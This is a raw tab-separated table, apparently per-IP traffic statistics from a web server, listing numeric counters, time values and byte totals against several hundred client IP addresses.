5	1	1	0	0	26022801	0	0	26022801	0	0	376	34.217.62.207
5	1	1	0	0	26022832	0	0	26022832	0	0	376	54.218.89.26
5	1	1	0	0	26171510	0	0	26171510	0	0	511	54.244.106.0
5	3	3	0	0	26357164	0	0	26353097	0	0	41773	195.154.63.222
5	1	1	0	0	26340574	0	0	26340574	0	0	39897	159.203.75.114
5	19	19	0	0	26281236	0	0	26072729	0	0	9439	60.191.38.77
5	1	0	0	0	26279151	0	0	26279151	0	0	12085	173.212.224.117
5	1	1	0	0	26176594	0	0	26176594	0	0	511	157.245.2.60
5	22	22	0	0	26350581	0	0	26006867	0	0	0	138.246.253.5
5	1	1	0	0	26038842	0	0	26038842	0	0	376	34.209.73.179
5	1	1	0	0	26227197	0	0	26227197	0	0	511	209.17.96.90
5	1	1	0	4	26000656	0	26000656	26000656	0	26000656	376	195.154.183.53
5	1	1	0	0	26126410	0	0	26126410	0	0	511	209.17.96.82
5	1	1	0	0	26071734	0	0	26071734	0	0	376	18.237.124.69
5	0	0	0	10	0	0	26341302	0	0	26188582	0	66.249.73.222
5	0	0	0	3	0	0	26296751	0	0	26237378	0	66.249.73.221
5	0	0	0	5	0	0	26341302	0	0	26236671	0	66.249.73.220
5	1	1	0	0	26091744	0	0	26091744	0	0	511	54.70.33.2
5	1	1	0	0	26237093	0	0	26237093	0	0	511	18.236.113.117
5	1	1	0	0	26053236	0	0	26053236	0	0	376	18.237.215.91
5	3	3	0	0	26348179	0	0	26015465	0	0	2094	209.17.96.66
5	1	1	0	0	26015653	0	0	26015653	0	0	376	54.189.134.210
5	1	1	0	0	26322435	0	0	26322435	0	0	39897	209.17.96.58
5	1	1	0	0	26012848	0	0	26012848	0	0	376	52.33.244.201
5	1	1	0	3	26097188	0	26097188	26097188	0	26097188	511	149.202.75.164
5	1	1	0	0	26239994	0	0	26239994	0	0	511	54.188.41.36
5	1	1	0	0	26089164	0	0	26089164	0	0	511	181.215.64.130
5	2	2	0	0	26272982	0	0	26166843	0	0	1022	209.17.96.50
5	0	0	0	1	0	0	25978671	0	0	25978671	0	66.133.109.36
5	1	1	0	0	26074781	0	0	26074781	0	0	376	54.185.207.237
5	1	1	0	0	26051831	0	0	26051831	0	0	376	52.11.223.202
5	1	1	0	3	26093943	0	26093943	26093943	0	26093943	511	46.101.174.128
5	1	1	0	0	26172712	0	0	26172712	0	0	511	54.71.50.14
5	1	1	0	0	25992539	0	0	25992539	0	0	376	34.218.232.126
5	3	3	0	0	26277055	0	0	26075696	0	0	1398	209.17.96.42
5	1	1	0	0	26118623	0	0	26118623	0	0	511	52.55.189.195
5	1	1	0	0	26262857	0	0	26262857	0	0	511	209.17.96.34
5	1	1	0	0	26248841	0	0	26248841	0	0	511	34.208.230.25
5	1	1	0	0	26174313	0	0	26174313	0	0	511	34.214.121.44
5	4	4	0	0	26307033	0	0	26121197	0	0	2313	209.17.96.26
5	1	1	0	0	26076052	0	0	26076052	0	0	376	34.213.201.61
5	1	1	0	0	26102499	0	0	26102499	0	0	511	54.71.201.26
5	3	3	0	0	26359408	0	0	26170959	0	0	40919	209.17.96.18
5	1	1	0	0	26178693	0	0	26178693	0	0	511	34.219.154.126
5	2	2	0	0	26342012	0	0	26069299	0	0	1314	209.17.96.10
5	1	1	0	0	26290978	0	0	26290978	0	0	0	142.93.157.50
5	1	1	0	0	26102080	0	0	26102080	0	0	511	35.160.108.217
5	1	1	0	0	26306931	0	0	26306931	0	0	780	157.245.4.165
5	1	1	0	0	26356567	0	0	26356567	0	0	938	92.63.111.27
5	0	0	0	2	0	0	26278285	0	0	26278285	0	222.191.233.238
5	1	1	0	0	26186859	0	0	26186859	0	0	511	54.188.22.95
5	1	1	0	0	26314926	0	0	26314926	0	0	780	35.160.30.215
5	1	0	0	0	26278289	0	0	26278289	0	0	39964	220.164.2.123
5	1	1	0	0	26116664	0	0	26116664	0	0	511	54.190.79.82
5	1	1	0	0	26113759	0	0	26113759	0	0	511	34.222.63.214
5	15	10	0	0	26276651	0	0	26276650	0	0	599111	137.59.252.172
5	1	1	0	0	26134002	0	0	26134002	0	0	511	34.221.106.52
5	1	1	0	0	26060487	0	0	26060487	0	0	376	18.236.64.56
5	0	0	0	1	0	0	26299381	0	0	26299381	0	107.179.19.68
5	6	6	0	0	26234862	0	0	25983604	0	0	81448	51.15.191.81
5	1	1	0	0	26035955	0	0	26035955	0	0	376	52.42.140.96
5	1	1	0	0	26093353	0	0	26093353	0	0	511	191.96.241.225
5	1	1	0	65	26055256	0	26055256	26055256	0	26055255	376	82.223.55.105
5	1	1	0	0	26082140	0	0	26082140	0	0	376	52.43.197.244
5	2	2	0	0	26237364	0	0	26066245	0	0	887	209.17.96.250
5	0	0	0	1	0	0	26278281	0	0	26278281	0	112.2.52.100
5	3	3	0	1	26352099	0	26342974	26106563	0	26342974	40919	209.17.96.242
5	1	1	0	0	26011210	0	0	26011210	0	0	376	209.17.96.234
5	1	1	0	0	26138321	0	0	26138321	0	0	511	34.211.67.235
5	1	1	0	0	26189841	0	0	26189841	0	0	511	54.188.219.226
5	1	1	0	0	26346527	0	0	26346527	0	0	938	68.183.59.215
5	1	1	0	0	26087263	0	0	26087263	0	0	511	45.86.247.36
5	2	2	0	0	26339047	0	0	26105461	0	0	1449	209.17.96.226
5	7	7	0	54	26030469	0	26030469	26030469	0	26030469	2632	46.105.17.29
5	1	1	0	0	26278290	0	0	26278290	0	0	12079	138.197.202.197
5	1	1	0	0	26095051	0	0	26095051	0	0	511	54.187.67.200
5	1	1	0	0	26151664	0	0	26151664	0	0	511	35.163.178.38
5	3	3	0	0	26247558	0	0	26061896	0	0	1398	209.17.96.218
5	10	10	0	3	26351780	0	26221722	26078652	0	26139132	6098	93.159.230.28
5	1	1	0	0	25999847	0	0	25999847	0	0	376	52.10.220.114
5	1	1	0	0	26346501	0	0	26346501	0	0	938	165.227.107.235
5	1	1	0	0	26231317	0	0	26231317	0	0	511	209.17.96.210
5	1	1	0	0	26188720	0	0	26188720	0	0	511	54.202.20.230
5	1	1	0	0	26241497	0	0	26241497	0	0	511	34.209.25.88
5	3	3	0	0	26317497	0	0	26131433	0	0	1802	209.17.96.194
5	3	3	0	0	26349147	0	0	26135923	0	0	2229	209.17.96.202
5	2	0	0	0	25985325	0	0	25979557	0	0	67824	192.150.244.126
5	0	0	0	1	0	0	26346505	0	0	26346505	0	64.225.13.209
5	4	4	0	0	26341463	0	0	26147551	0	0	2471	209.17.96.186
5	1	1	0	0	26303636	0	0	26303636	0	0	780	185.234.218.50
5	1	1	0	1	26267349	0	26352187	26267349	0	26352187	511	209.17.96.178
5	1	1	0	0	26176466	0	0	26176466	0	0	511	159.89.183.246
5	1	1	0	0	26227104	0	0	26227104	0	0	511	38.145.93.113
5	1	1	0	0	26338003	0	0	26338003	0	0	39897	209.17.96.170
5	0	0	0	1	0	0	26122512	0	0	26122512	0	91.121.209.213
5	1	1	0	0	26267515	0	0	26267515	0	0	511	18.237.79.206
5	1	1	0	0	26322633	0	0	26322633	0	0	780	209.17.96.162
5	1	1	0	0	26191587	0	0	26191587	0	0	511	35.166.174.206
5	1	1	0	0	26099920	0	0	26099920	0	0	511	34.219.142.51
5	1	1	0	0	26150192	0	0	26150192	0	0	511	34.219.4.234
5	1	1	0	0	26021291	0	0	26021291	0	0	376	54.185.77.224
5	4	4	0	0	26349389	0	0	26171465	0	0	2471	82.202.161.133
5	1	1	0	0	26296347	0	0	26296347	0	0	511	34.223.94.87
5	2	2	0	0	26347993	0	0	26155847	0	0	1449	209.17.96.146
5	1	1	0	0	26182935	0	0	26182935	0	0	511	54.244.58.94
5	1	1	0	0	26312028	0	0	26312028	0	0	780	54.189.117.125
5	1	1	0	0	26242854	0	0	26242854	0	0	511	18.236.221.100
5	1	1	0	0	26145320	0	0	26145320	0	0	511	35.167.9.65
5	1	1	0	0	26294857	0	0	26294857	0	0	511	34.213.213.95
5	1	1	0	0	26182653	0	0	26182653	0	0	511	54.70.0.171
5	0	0	0	1	0	0	26172472	0	0	26172472	0	80.84.57.115
5	2	2	0	1	26359228	0	26338118	26100442	0	26338118	1449	209.17.96.138
5	0	0	0	6	0	0	26170704	0	0	25982611	0	66.249.65.80
5	1	1	0	0	26172471	0	0	26172471	0	0	511	80.84.57.113
5	0	0	0	1	0	0	25983885	0	0	25983885	0	66.249.65.78
5	1	1	0	0	26017300	0	0	26017300	0	0	376	52.12.67.176
5	0	0	0	5	0	0	26119279	0	0	25982610	0	66.249.65.76
5	0	0	0	1	0	0	26172472	0	0	26172472	0	80.84.57.109
5	0	0	0	2	0	0	26172473	0	0	26172472	0	80.84.57.108
5	1	1	0	0	26307051	0	0	26307051	0	0	780	209.97.149.71
5	0	0	0	1	0	0	26172472	0	0	26172472	0	80.84.57.107
5	0	0	0	1	0	0	26172472	0	0	26172472	0	80.84.57.106
5	2	2	0	0	26352022	0	0	26207744	0	0	1449	209.17.96.130
5	17	17	0	0	26351780	0	0	26015663	0	0	9135	77.74.177.114
5	21	21	0	0	26262042	0	0	26038332	0	0	10461	77.74.177.113
5	1	1	0	0	26049120	0	0	26049120	0	0	376	18.237.197.168
5	0	0	0	1	0	0	26172472	0	0	26172472	0	80.84.57.101
5	3	3	0	1	26342800	0	26359341	26111666	0	26359341	41188	209.17.96.122
5	1	1	0	0	26055012	0	0	26055012	0	0	376	35.168.18.210
5	2	2	0	1	26357883	0	26321578	26321380	0	26321578	1718	209.17.96.114
5	1	1	0	0	25988330	0	0	25988330	0	0	376	34.222.52.92
5	1	1	0	0	26030239	0	0	26030239	0	0	376	34.220.32.219
5	3	3	0	0	26323255	0	0	26132272	0	0	1802	209.17.96.106
5	1	1	0	0	26128316	0	0	26128316	0	0	511	167.71.250.74
5	1	1	0	0	26181180	0	0	26181180	0	0	511	52.11.255.178
5	1	1	0	0	26131084	0	0	26131084	0	0	511	34.223.251.22
5	1	1	0	0	25992643	0	0	25992643	0	0	376	54.186.122.3
5	1	1	0	3	26017937	0	26017937	26017937	0	26017937	376	84.246.231.100
5	1	1	0	0	26049518	0	0	26049518	0	0	376	212.180.208.122
5	0	0	0	1	0	0	26319470	0	0	26319470	0	18.191.7.159
5	1	1	0	0	26074745	0	0	26074745	0	0	376	18.236.76.70
5	1	1	0	0	26025764	0	0	26025764	0	0	376	54.245.55.233
5	1	1	0	0	26086545	0	0	26086545	0	0	511	18.237.203.3
5	1	1	0	0	25982626	0	0	25982626	0	0	97	35.161.214.202
5	2	2	0	13	26034926	0	26034926	26034926	0	26034926	752	149.202.215.42
5	1	1	0	0	26296685	0	0	26296685	0	0	0	3.1.212.86
5	1	1	0	0	26112372	0	0	26112372	0	0	511	52.27.93.97
5	1	1	0	0	26065751	0	0	26065751	0	0	376	162.223.10.47
5	1	1	0	0	26348655	0	0	26348655	0	0	938	198.27.85.233
5	0	0	0	4	0	0	25996159	0	0	25987275	0	66.249.64.210
5	1	1	0	0	26065751	0	0	26065751	0	0	376	198.134.108.30
5	0	0	0	5	0	0	26324016	0	0	26233576	0	66.249.75.114
5	0	0	0	4	0	0	25996159	0	0	25987275	0	66.249.64.206
5	1	1	0	0	26089587	0	0	26089587	0	0	511	34.210.69.112
5	1	1	0	0	26105136	0	0	26105136	0	0	511	54.188.103.150
5	3	3	0	0	26351861	0	0	26241268	0	0	2387	209.17.97.98
5	15	10	0	0	26270164	0	0	26270164	0	0	598931	196.52.84.53
5	0	0	0	4	0	0	26357602	0	0	26232718	0	66.249.75.112
5	0	0	0	6	0	0	26357602	0	0	26232718	0	66.249.75.110
5	1	1	0	0	26227105	0	0	26227105	0	0	511	181.214.191.236
5	1	1	0	0	26156929	0	0	26156929	0	0	511	178.128.193.158
5	1	1	0	0	26050309	0	0	26050309	0	0	376	34.214.126.158
5	1	1	0	0	26011407	0	0	26011407	0	0	376	34.215.219.9
5	3	3	0	0	26338581	0	0	26097311	0	0	1960	209.17.97.90
5	1	1	0	0	26064562	0	0	26064562	0	0	376	52.36.185.58
5	0	0	0	1	0	0	26278283	0	0	26278283	0	37.9.40.134
5	1	1	0	0	25985461	0	0	25985461	0	0	630	34.208.155.83
5	0	0	0	12	0	0	26014499	0	0	26014498	0	199.229.249.169
5	2	2	0	0	26146426	0	0	26081157	0	0	887	209.17.97.82
5	1	1	0	0	26115236	0	0	26115236	0	0	511	35.160.85.81
5	1	1	0	0	26181531	0	0	26181531	0	0	511	54.202.8.193
5	1	1	0	0	26195809	0	0	26195809	0	0	511	18.236.164.12
5	1	1	0	0	26033134	0	0	26033134	0	0	376	34.220.181.11
5	2	2	0	0	26301086	0	0	26192664	0	0	1036	209.17.97.74
5	0	0	0	2	0	0	26079411	0	0	26079411	0	185.172.110.74
5	9	9	0	13	26278279	0	26278279	26278279	0	26278279	359620	196.52.84.24
5	1	1	0	0	26297890	0	0	26297890	0	0	39897	167.172.253.24
5	1	1	0	0	26110491	0	0	26110491	0	0	511	209.17.97.66
5	1	1	0	0	26002605	0	0	26002605	0	0	376	18.237.34.75
5	2	2	0	0	26186978	0	0	26150733	0	0	1022	209.17.97.58
5	1	1	0	0	26079019	0	0	26079019	0	0	376	34.219.214.46
5	0	0	0	1	0	0	26348308	0	0	26348308	0	209.17.97.50
5	0	0	0	6	0	0	26201035	0	0	26182977	0	66.249.64.146
5	1	1	0	2	26118768	0	26118768	26118768	0	26118768	511	46.32.249.72
5	0	0	0	4	0	0	26201035	0	0	26182977	0	66.249.64.144
5	1	1	0	0	26081809	0	0	26081809	0	0	376	38.145.95.145
5	0	0	0	6	0	0	26199829	0	0	26172303	0	66.249.64.142
5	1	1	0	0	26287375	0	0	26287375	0	0	511	51.158.98.255
5	3	3	0	0	26280899	0	0	26140418	0	0	1533	209.17.97.42
5	1	1	0	0	25995556	0	0	25995556	0	0	376	54.214.221.228
5	0	0	0	2	0	0	26226453	0	0	26226453	0	66.249.64.138
5	0	0	0	1	0	0	26092516	0	0	26092516	0	192.99.38.186
5	1	1	0	0	26096212	0	0	26096212	0	0	511	205.237.94.158
5	1	1	0	0	26092000	0	0	26092000	0	0	511	38.131.153.148
5	1	1	0	5	26012582	0	26012582	26012582	0	26012582	376	173.249.158.21
5	2	2	0	0	26347950	0	0	26200539	0	0	40408	209.17.97.34
5	1	1	0	0	26048946	0	0	26048946	0	0	376	35.160.222.91
5	1	1	0	0	26165377	0	0	26165377	0	0	511	54.213.12.192
5	1	1	0	0	26046016	0	0	26046016	0	0	376	54.191.212.237
5	3	3	0	0	26338173	0	0	26096253	0	0	1960	209.17.97.26
5	1	1	0	0	26353134	0	0	26353134	0	0	938	163.172.70.242
5	1	1	0	0	26184392	0	0	26184392	0	0	511	34.217.42.155
5	1	0	0	0	26278287	0	0	26278287	0	0	39962	41.139.217.254
5	1	1	0	0	26129012	0	0	26129012	0	0	511	167.71.97.44
5	1	1	0	0	26120950	0	0	26120950	0	0	511	34.222.160.200
5	0	0	0	5	0	0	26012231	0	0	26012231	0	178.211.62.152
5	4	4	0	0	26182767	0	0	26090906	0	0	2044	209.17.97.18
5	0	0	0	41	0	0	26347031	0	0	26202211	0	66.249.64.114
5	0	0	0	43	0	0	26344169	0	0	26212823	0	66.249.64.112
5	1	1	0	0	26141116	0	0	26141116	0	0	511	35.165.85.96
5	0	0	0	49	0	0	26347031	0	0	26202211	0	66.249.64.110
5	1	1	0	0	26218409	0	0	26218409	0	0	511	34.219.253.97
5	1	1	0	0	26250375	0	0	26250375	0	0	511	34.253.185.68
5	3	3	0	0	26342951	0	0	26258125	0	0	1960	209.17.97.10
5	1	1	0	0	26098703	0	0	26098703	0	0	511	54.185.128.139
5	1	1	0	0	26151786	0	0	26151786	0	0	511	103.249.89.254
5	0	0	0	2	0	0	26248075	0	0	26246645	0	66.249.64.100
5	1	1	0	0	26031658	0	0	26031658	0	0	376	54.71.18.130
5	1	1	0	0	26077635	0	0	26077635	0	0	376	34.216.165.217
5	1	1	0	0	26103417	0	0	26103417	0	0	511	34.218.77.254
5	1	1	0	0	26063332	0	0	26063332	0	0	376	54.187.218.194
5	0	0	0	1	0	0	26306923	0	0	26306923	0	68.183.51.234
5	1	1	0	0	26201162	0	0	26201162	0	0	511	54.184.117.55
5	1	1	0	5	26072082	0	26072082	26072082	0	26072082	376	5.196.100.175
5	1	0	0	0	26278289	0	0	26278289	0	0	39966	61.189.47.93
5	1	1	0	0	26139566	0	0	26139566	0	0	511	34.222.89.135
5	0	0	0	1	0	0	26187349	0	0	26187349	0	66.249.69.46
5	1	1	0	0	26055987	0	0	26055987	0	0	376	54.245.143.7
5	3	3	0	0	26353129	0	0	26353071	0	0	41785	195.154.62.232
5	1	1	0	0	25981118	0	0	25981118	0	0	97	34.211.146.171
5	1	1	0	0	26346516	0	0	26346516	0	0	39897	165.227.109.153
5	1	1	0	0	26192704	0	0	26192704	0	0	511	34.222.189.143
5	1	1	0	0	26070476	0	0	26070476	0	0	376	54.201.111.95
5	1	0	0	0	26298585	0	0	26298585	0	0	12078	181.119.18.7
5	1	0	0	0	26278294	0	0	26278294	0	0	39958	183.234.36.42
5	4	4	0	0	26338780	0	0	26338780	0	0	3752	34.76.88.150
5	1	1	0	0	25998341	0	0	25998341	0	0	376	35.160.58.59
5	1	1	0	0	26090978	0	0	26090978	0	0	511	52.10.25.200
5	1	1	0	0	26159169	0	0	26159169	0	0	511	103.249.89.209
5	1	1	0	0	26086096	0	0	26086096	0	0	511	181.214.187.59
5	0	0	0	2	0	0	26090219	0	0	26049375	0	66.249.70.18
5	1	1	0	0	26244509	0	0	26244509	0	0	511	34.213.201.253
5	1	1	0	0	26017072	0	0	26017072	0	0	376	54.202.76.187
5	1	1	0	0	26066179	0	0	26066179	0	0	376	54.189.23.73
5	1	0	0	0	25979880	0	0	25979880	0	0	33912	174.207.1.191
5	1	1	0	0	26306935	0	0	26306935	0	0	39897	157.245.14.155
5	0	0	0	2	0	0	26090219	0	0	26049375	0	66.249.70.14
5	1	1	0	0	26037268	0	0	26037268	0	0	376	34.222.143.252
5	1	1	0	0	26157341	0	0	26157341	0	0	511	34.209.151.5
5	1	1	0	0	26177521	0	0	26177521	0	0	511	45.55.41.245
5	1	1	0	0	26185822	0	0	26185822	0	0	511	52.32.156.116
5	1	1	0	0	26038842	0	0	26038842	0	0	376	35.164.93.185
5	1	1	0	0	26090485	0	0	26090485	0	0	511	45.82.50.120
5	1	1	0	0	26106594	0	0	26106594	0	0	511	54.185.183.125
5	1	1	0	0	25994132	0	0	25994132	0	0	376	54.188.171.165
5	1	1	0	0	26060266	0	0	26060266	0	0	376	18.237.35.253
5	1	1	0	0	26152188	0	0	26152188	0	0	511	52.25.224.8
5	1	1	0	0	26071900	0	0	26071900	0	0	376	35.166.171.168
5	1	1	0	0	26170924	0	0	26170924	0	0	511	54.148.252.41
5	1	1	0	0	26208576	0	0	26208576	0	0	511	18.237.240.135
5	1	0	0	0	26278292	0	0	26278292	0	0	39950	37.9.47.150
5	1	1	0	0	26160243	0	0	26160243	0	0	511	35.153.102.177
5	1	1	0	0	26260082	0	0	26260082	0	0	511	68.183.146.20
5	0	0	0	1	0	0	26323097	0	0	26323097	0	157.245.167.35
5	1	1	0	0	25986819	0	0	25986819	0	0	630	34.213.112.103
5	1	1	0	8	26136112	0	26136112	26136112	0	26136111	511	132.148.245.106
5	1	1	0	0	26067557	0	0	26067557	0	0	376	34.216.224.220
5	1	1	0	0	26197370	0	0	26197370	0	0	511	54.186.209.183
5	1	1	0	0	26109622	0	0	26109622	0	0	511	34.214.104.136
5	2	2	0	13	26036502	0	26036502	26036502	0	26036502	752	46.105.92.10
5	1	1	0	0	26235693	0	0	26235693	0	0	511	54.202.129.61
5	1	1	0	0	26064813	0	0	26064813	0	0	376	52.12.220.175
5	1	1	0	0	26226704	0	0	26226704	0	0	511	85.195.230.179
5	1	1	0	3	26158493	0	26158494	26158493	0	26158493	511	162.243.165.84
5	4	4	0	39	26078899	0	26078899	26078877	0	26078872	1504	165.227.134.117
5	1	1	0	0	26094933	0	0	26094933	0	0	511	45.82.48.13
5	1	1	0	0	26047636	0	0	26047636	0	0	376	35.160.207.251
5	1	1	0	0	26260030	0	0	26260030	0	0	39909	167.172.29.29
5	1	1	0	0	25997006	0	0	25997006	0	0	376	54.148.0.25
5	1	1	0	0	26165035	0	0	26165035	0	0	511	54.200.5.203
5	1	1	0	0	26123913	0	0	26123913	0	0	511	34.220.137.6
5	1	1	0	0	26116634	0	0	26116634	0	0	511	34.214.184.24
5	1	1	0	0	26177516	0	0	26177516	0	0	511	45.55.46.103
5	1	1	0	0	26057644	0	0	26057644	0	0	376	54.186.19.219
5	2	2	0	0	26181254	0	0	26181163	0	0	1022	89.208.29.224
5	0	0	0	54	0	0	26278764	0	0	26278763	0	195.206.105.213
5	1	1	0	6	26162307	0	26162307	26162307	0	26162307	0	45.93.20.4
5	1	1	0	0	26210449	0	0	26210449	0	0	511	52.27.113.63
5	1	1	0	0	26168131	0	0	26168131	0	0	511	34.214.18.150
5	1	1	0	0	26228515	0	0	26228515	0	0	511	34.221.185.99
5	1	1	0	0	26037226	0	0	26037226	0	0	376	35.161.90.28
5	1	1	0	0	26306922	0	0	26306922	0	0	780	167.71.102.67
5	1	1	0	14	26259571	0	26259571	26259571	0	26259570	511	212.92.121.117
5	1	1	0	0	26017300	0	0	26017300	0	0	376	35.163.136.135
5	1	1	0	0	26118042	0	0	26118042	0	0	511	34.221.104.190
5	1	1	0	0	26122430	0	0	26122430	0	0	511	18.236.92.248
5	1	1	0	0	26027186	0	0	26027186	0	0	376	34.209.55.161
5	22	22	0	0	26343380	0	0	25980486	0	0	10301	137.226.113.28
5	28	28	0	0	26343444	0	0	26031375	0	0	14060	137.226.113.27
5	1	1	0	0	26107839	0	0	26107839	0	0	511	34.220.58.120
5	0	0	0	8	0	0	26115522	0	0	26093001	0	213.186.202.190
5	36	36	0	0	26343425	0	0	25980595	0	0	17732	137.226.113.26
5	1	1	0	1	26181052	0	26181052	26181052	0	26181052	511	185.195.237.157
5	1	1	0	0	26115072	0	0	26115072	0	0	511	54.201.118.7
5	1	1	0	0	26260029	0	0	26260029	0	0	39897	167.71.107.220
5	1	1	0	0	26238618	0	0	26238618	0	0	511	34.215.84.32
5	1	1	0	0	26108006	0	0	26108006	0	0	511	52.36.255.163
5	1	1	0	0	26203013	0	0	26203013	0	0	511	54.245.10.80
5	1	1	0	0	26027059	0	0	26027059	0	0	376	54.218.99.55
5	1	1	0	0	26152929	0	0	26152929	0	0	511	34.211.12.148
5	1	1	0	0	25999825	0	0	25999825	0	0	376	34.222.162.165
5	16	16	0	0	26358529	0	0	26227419	0	0	0	52.34.24.33
5	1	1	0	0	26006922	0	0	26006922	0	0	376	18.237.176.58
5	1	1	0	0	26037481	0	0	26037481	0	0	376	52.206.145.141
5	1	1	0	2	26072350	0	26072350	26072350	0	26072350	376	153.126.194.159
5	1	1	0	0	26083149	0	0	26083149	0	0	376	191.96.46.5
5	1	1	0	0	26093654	0	0	26093654	0	0	511	52.38.34.195
5	1	1	0	0	26001354	0	0	26001354	0	0	376	34.216.179.66
5	1	1	0	0	26223107	0	0	26223107	0	0	511	212.83.146.233
5	1	1	0	0	26050391	0	0	26050391	0	0	376	34.216.172.43
5	0	0	0	4	0	0	26185740	0	0	26120842	0	66.249.79.210
5	0	0	0	4	0	0	26150904	0	0	26057430	0	66.249.79.208
5	1	0	0	0	26278953	0	0	26278953	0	0	12081	5.9.97.68
5	0	0	0	2	0	0	26150904	0	0	26057430	0	66.249.79.206
5	1	0	0	0	26253840	0	0	26253840	0	0	12078	67.205.153.94
5	1	1	0	0	26205998	0	0	26205998	0	0	511	34.222.221.239
5	0	0	0	5	0	0	26011131	0	0	26011131	0	167.99.209.230
5	1	1	0	0	26258232	0	0	26258232	0	0	39909	167.172.25.176
5	2	2	0	0	26012263	0	0	26000502	0	0	752	51.15.192.148
5	1	1	0	0	25991141	0	0	25991141	0	0	376	34.219.11.26
5	1	1	0	0	26020046	0	0	26020046	0	0	376	34.220.17.126
5	1	1	0	0	26070290	0	0	26070290	0	0	376	34.222.84.72
5	1	0	0	0	26278290	0	0	26278290	0	0	39970	190.182.179.11
5	1	1	0	0	26043236	0	0	26043236	0	0	376	18.236.97.120
5	1	1	0	0	26063071	0	0	26063071	0	0	376	34.219.11.18
5	0	0	0	2	0	0	26131343	0	0	26131343	0	50.63.167.135
5	1	1	0	0	26194461	0	0	26194461	0	0	511	18.236.233.240
5	0	0	0	1	0	0	26342737	0	0	26342737	0	66.249.79.167
5	0	0	0	3	0	0	26342737	0	0	26291018	0	66.249.79.164
5	1	1	0	0	26128499	0	0	26128499	0	0	511	167.71.91.58
5	1	1	0	0	26103783	0	0	26103783	0	0	511	34.208.87.137
5	0	0	0	7	0	0	26270597	0	0	26270597	0	185.234.216.20
5	1	1	0	0	26231386	0	0	26231386	0	0	511	34.220.18.22
5	1	1	0	0	26214683	0	0	26214683	0	0	511	134.209.170.103
5	1	0	0	0	26299387	0	0	26299387	0	0	12089	46.101.104.225
5	1	1	0	0	26008619	0	0	26008619	0	0	376	34.209.214.0
5	1	1	0	0	26080090	0	0	26080090	0	0	376	18.232.63.209
5	0	0	0	1	0	0	26278284	0	0	26278284	0	103.192.76.205
5	1	1	0	0	26044566	0	0	26044566	0	0	376	195.201.171.107
5	1	1	0	0	26346462	0	0	26346462	0	0	938	165.227.97.112
5	0	0	0	1	0	0	26278282	0	0	26278282	0	60.172.231.12
5	1	1	0	0	26041939	0	0	26041939	0	0	376	54.202.101.179
5	3	3	0	0	26359429	0	0	26100319	0	0	1960	209.17.97.2
5	3	3	0	0	26181433	0	0	26181197	0	0	1533	104.194.203.5
5	0	0	0	1	0	0	26204921	0	0	26204921	0	159.203.86.82
5	1	1	0	0	26139213	0	0	26139213	0	0	511	54.214.128.33
5	1	1	0	0	26012410	0	0	26012410	0	0	376	51.158.117.104
5	1	1	0	0	26044518	0	0	26044518	0	0	376	34.219.174.234
5	1	1	0	0	26234225	0	0	26234225	0	0	511	54.202.155.204
5	2	2	0	0	26250014	0	0	26250014	0	0	1022	3.15.219.153
5	2	2	0	0	26287812	0	0	26287099	0	0	12588	163.172.163.25
5	1	1	0	0	26101210	0	0	26101210	0	0	511	52.11.38.165
5	1	1	0	0	26149219	0	0	26149219	0	0	511	54.184.146.132
5	2	0	0	0	26278293	0	0	26278293	0	0	79908	103.192.76.137
5	1	1	0	0	26058941	0	0	26058941	0	0	376	54.213.133.15
5	1	1	0	0	26260070	0	0	26260070	0	0	511	157.245.221.28
5	1	1	0	0	26040331	0	0	26040331	0	0	376	34.219.171.36
5	1	1	0	0	26180113	0	0	26180113	0	0	511	54.185.163.205
5	1	1	0	0	26298603	0	0	26298603	0	0	39909	157.245.213.170
5	1	1	0	0	26315135	0	0	26315135	0	0	0	91.241.19.38
5	1	1	0	0	25989818	0	0	25989818	0	0	376	54.149.108.174
5	1	1	0	0	26057356	0	0	26057356	0	0	376	54.185.238.156
5	1	1	0	0	26211583	0	0	26211583	0	0	511	54.218.248.17
5	1	1	0	0	26028635	0	0	26028635	0	0	376	54.245.4.88
5	1	1	0	0	26084416	0	0	26084416	0	0	511	191.101.215.180
5	0	0	0	6	0	0	26208562	0	0	26208560	0	138.197.202.34
5	1	0	0	0	26278288	0	0	26278288	0	0	39964	180.183.243.80
5	2	2	0	0	26160732	0	0	26150649	0	0	1022	209.17.96.2
5	1	1	0	0	26207339	0	0	26207339	0	0	511	52.40.71.44
5	1	1	0	0	26034471	0	0	26034471	0	0	376	34.217.71.207
5	1	1	0	0	26024425	0	0	26024425	0	0	376	52.36.252.223
5	1	0	0	0	26351891	0	0	26351891	0	0	12086	85.133.220.134
5	1	1	0	0	26170932	0	0	26170932	0	0	511	35.161.72.240
5	20	20	0	0	26355554	0	0	26223110	0	0	0	35.162.70.167
5	1	1	0	0	26129003	0	0	26129003	0	0	511	167.71.251.150
5	0	0	0	1	0	0	26278281	0	0	26278281	0	72.210.252.148
5	0	0	0	1	0	0	26258138	0	0	26258138	0	157.245.118.80
5	1	1	0	0	26213101	0	0	26213101	0	0	511	34.221.136.166
5	1	1	0	0	26025764	0	0	26025764	0	0	376	34.220.203.225
5	0	0	0	1	0	0	26260072	0	0	26260072	0	167.71.95.199
5	1	1	0	0	26020055	0	0	26020055	0	0	376	54.244.107.19
5	1	1	0	1	26287670	0	26288730	26287670	0	26288730	12080	51.158.97.248
5	1	1	0	0	26080741	0	0	26080741	0	0	376	54.200.173.226
5	11	11	0	86	26166591	0	26166591	26166573	0	26166573	5621	192.95.14.196
5	1	1	0	0	25995556	0	0	25995556	0	0	376	34.216.234.247
5	1	1	0	0	26097497	0	0	26097497	0	0	511	54.185.184.89
5	1	1	0	0	26119245	0	0	26119245	0	0	511	54.191.246.181
5	1	1	0	0	26132603	0	0	26132603	0	0	511	35.163.45.240
5	2	2	0	0	25978740	0	0	25978679	0	0	194	45.63.15.169
5	1	0	0	0	26278287	0	0	26278287	0	0	39962	46.148.112.253
5	1	1	0	0	26042944	0	0	26042944	0	0	376	54.200.72.204
5	1	1	0	0	26172471	0	0	26172471	0	0	511	80.84.57.97
5	0	0	0	1	0	0	26172472	0	0	26172472	0	80.84.57.96
5	1	0	0	0	25978675	0	0	25978675	0	0	33912	174.207.9.97
5	0	0	0	4	0	0	26292956	0	0	26292956	0	206.189.120.61
5	1	1	0	0	26340845	0	0	26340845	0	0	39909	64.225.19.133
5	1	1	0	0	26260065	0	0	26260065	0	0	511	167.172.22.219
5	1	1	0	0	26142404	0	0	26142404	0	0	511	52.35.154.133
5	1	1	0	0	26193000	0	0	26193000	0	0	511	54.202.203.248
5	1	1	0	0	26208805	0	0	26208805	0	0	511	54.203.177.110
5	9	9	0	13	26280128	0	26280129	26280128	0	26280128	359512	185.128.26.23
